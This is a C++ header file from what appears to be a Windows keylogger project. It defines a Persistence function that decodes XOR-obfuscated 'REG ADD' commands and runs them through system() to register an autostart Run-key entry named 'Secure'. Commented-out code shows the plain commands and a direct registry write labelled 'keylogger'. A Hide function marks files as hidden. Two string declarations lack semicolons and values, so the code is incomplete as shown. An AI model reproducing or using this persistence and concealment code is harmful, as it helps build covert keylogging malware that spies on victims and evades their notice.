#pragma once
#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <windows.h>
#include <fstream>
#include <ctime>
#include <csignal>
#include <bitset>
#include <sstream>
#include <iostream>
#include "Encryption.h"

void Persistence(std::string action,std::string file) {
	//reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run / v MyApp / t REG_SZ / d "C:\Program Files\MyApp\MyApp.exe"  
	//std::string result = "cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D" + keylogger;
	//const char* myCString = result.c_str();
	//system(myCString); //add registry persistence 
	//
	 //std::string result = "cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D" + keylogger;
	 //system(result)
	std::string add_reg
	std::string del_reg
	std::string keyy = "secure_101";
	if (action == "add") {
		std::string result = xor_binary_string(add_reg, keyy) + "	 \"" + file + "\" ";
		const char* myCString = result.c_str();
		std::cout << std::endl << myCString << std::endl;
		system(myCString); //add registry persistence 
	}
	else {
		std::string result = xor_binary_string(del_reg, keyy);
		const char* myCString = result.c_str();
		std::cout << std::endl << myCString << std::endl;
		system(myCString); //add registry persistence 
	}

	/*HKEY nKey = NULL;
	if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, (KEY_CREATE_SUB_KEY | KEY_SET_VALUE), NULL, &nKey, NULL) == ERROR_SUCCESS) {
		RegSetValueExA(nKey, "keylogger", 0, REG_SZ, (LPBYTE)keylogger.c_str(), keylogger.length());
		RegCloseKey(nKey);
	}*/
}

void Hide(std::string file) {
	DWORD attr = GetFileAttributesA(file.c_str());
	if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
		SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
	}
}